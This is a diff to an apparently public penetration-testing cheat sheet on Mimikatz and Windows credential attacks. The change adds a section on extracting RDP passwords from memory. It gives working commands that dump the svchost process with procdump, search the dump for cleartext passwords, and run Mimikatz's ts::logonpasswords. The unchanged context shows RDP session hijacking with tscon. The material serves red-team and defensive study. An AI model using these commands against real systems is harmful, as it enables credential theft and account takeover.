@@ -9,7 +9,8 @@
 * [Pass The Hash](#pass-the-hash)
 * [Golden ticket](#golden-ticket)
 * [Skeleton key](#skeleton-key)
-* [RDP session takeover](#rdp-session-takeover)
+* [RDP Session Takeover](#rdp-session-takeover)
+* [RDP Passwords](#rdp-passwords)
 * [Credential Manager & DPAPI](#credential-manager--dpapi)
   * [Chrome Cookies & Credential](#chrome-cookies--credential)
   * [Task Scheduled credentials](#task-scheduled-credentials)
@@ -168,7 +169,7 @@ net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
-## RDP session takeover
+## RDP Session Takeover
 
 Use `ts::multirdp` to patch the RDP service to allow more than two users.
 
@@ -194,6 +195,34 @@ query user
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
+
+## RDP Passwords
+
+Verify if the service is running: 
+
+```ps1
+sc queryex termservice
+tasklist /M:rdpcorets.dll
+netstat -nob | Select-String TermService -Context 1
+```
+
+* Extract passwords manually
+  ```ps1
+  procdump64.exe -ma 988 -accepteula C:\svchost.dmp
+  strings -el svchost* | grep Password123 -C3
+  ```
+* Extract passwords using Mimikatz
+  ```ps1
+  privilege::debug
+  ts::logonpasswords
+  ```
+
+
+
+
+
+
+
 
 
 ## Credential Manager & DPAPI
@@ -286,3 +315,4 @@ More information can be grabbed from the Memory with :
 - [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
 - [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
 - [Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)
+- [Dumping RDP Credentials - MAY 24, 2021](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)
